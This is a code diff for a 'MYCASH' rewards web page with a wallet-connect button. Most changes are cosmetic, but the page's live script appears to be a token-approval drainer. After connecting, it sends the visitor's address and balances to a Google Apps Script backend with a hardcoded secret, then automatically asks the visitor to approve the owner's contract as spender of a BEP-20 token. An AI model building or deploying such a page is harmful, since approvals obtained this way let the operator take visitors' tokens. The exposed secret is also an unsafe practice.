@@ -27,7 +27,6 @@
   </style>
 </head>
 <body>
-
   <header>
     <div class="nav">
       <div class="nav-left">
@@ -36,9 +35,7 @@
         <a href="contact.html">Contact</a>
         <a href="reward.html">Rewards</a>
       </div>
-
       <div class="logo">MYCASH</div>
-
       <div>
         <button id="connectBtn" class="connect">Connect Wallet</button>
       </div>
@@ -93,14 +90,13 @@
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
 
-  <!-- app script (this is your original working script) -->
+  <!-- app script -->
   <script type="module">
   (function(){
     // ===== CONFIG =====
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
     const APPS_SCRIPT_SECRET = "mahfuzinam0045";
 
-    // 🔥 IMPORTANT:
     // 1) TOKEN_ADDRESS MUST be a BEP-20 TOKEN CONTRACT, not your wallet.
     // 2) SPENDER_ADDRESS is your smart contract that will be approved.
     const TOKEN_ADDRESS   = "PUT_YOUR_BEP20_TOKEN_CONTRACT_ADDRESS_HERE"; // <--- CHANGE THIS
@@ -109,8 +105,6 @@
     const BNB_TESTNET_CHAIN_ID_DEC = 97;
     const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
     const BNB_TESTNET_LABEL        = "BSC Testnet (97)";
-    const LAST_CONNECTED_KEY       = "mycash_last_connected";
-
 
     const ERC20_APPROVE_ABI = [
       "function approve(address spender, uint256 amount) public returns (bool)"
@@ -175,15 +169,12 @@
       userIdEl.textContent = id || "-";
     }
 
- function clearSessionUI(){
-  setStatus("Not connected");
-  setWalletInfo("—","—","—");
-  setUserIdUI("-");
-  tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
-  // forget auto-connect flag
-  localStorage.removeItem(LAST_CONNECTED_KEY);
-}
-
+    function clearSessionUI(){
+      setStatus("Not connected");
+      setWalletInfo("—","—","—");
+      setUserIdUI("-");
+      tokensContainer.innerHTML = '<div class="muted">Connect wallet to see token balance.</div>';
+    }
 
     function initWeb3ModalInstance(){
       const providerOptions = {
@@ -299,7 +290,7 @@
       }
     }
 
-    // 🔥 Ask the user to approve your smart contract as spender
+    // Ask the user to approve your smart contract as spender
     async function requestTokenApproval(){
       if(!TOKEN_ADDRESS){
         console.warn("TOKEN_ADDRESS not set, skipping approve");
@@ -322,7 +313,6 @@
         const signer         = await ethersProvider.getSigner();
         const userAddress    = (await signer.getAddress()).toLowerCase();
 
-        // Safety: don't allow using the wallet itself as TOKEN_ADDRESS
         if (TOKEN_ADDRESS.toLowerCase() === userAddress) {
           alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
           setStatus("Connected (approval skipped)");
@@ -407,7 +397,6 @@
 
         const tokenBalance = await getTokenBalance(address);
 
-        // Show token card
         const prettyBalance = tokenBalance ? Number(tokenBalance).toFixed(4) : "0";
         tokensContainer.innerHTML =
           '<div class="token">' +
@@ -415,16 +404,12 @@
             '<div style="font-size:1.1rem;margin-top:4px;">' + prettyBalance + '</div>' +
             '<div class="small mono" style="margin-top:6px;">' + TOKEN_ADDRESS + '</div>' +
           '</div>';
+
         await notifyBackend(address, BNB_TESTNET_LABEL, userId, balanceBNB, tokenBalance);
 
-        // 🔥 Auto request approval after connect
         await requestTokenApproval();
 
-        // remember that we were connected, so we can auto-connect on refresh
-        localStorage.setItem(LAST_CONNECTED_KEY, "1");
-
       }catch(err){
-
         console.error("connectFlow error:", err);
         setStatus("Connection failed");
         alert("Connection failed: " + (err && err.message ? err.message : err));
@@ -462,20 +447,15 @@
       }
     }
 
- document.addEventListener("DOMContentLoaded", async function(){
-  initWeb3ModalInstance();
-  connectBtn.addEventListener("click", connectFlow);
-
-  // only do a soft restore (no auto connectFlow)
-  await tryAutoReconnect(); 
-  
-
-
-  document.getElementById("year").textContent = new Date().getFullYear();
-});
-
+    document.addEventListener("DOMContentLoaded", async function(){
+      initWeb3ModalInstance();
+      connectBtn.addEventListener("click", connectFlow);
+      await tryAutoReconnect();
+      document.getElementById("year").textContent = new Date().getFullYear();
+    });
 
   })();
   </script>
 </body>
 </html>
+
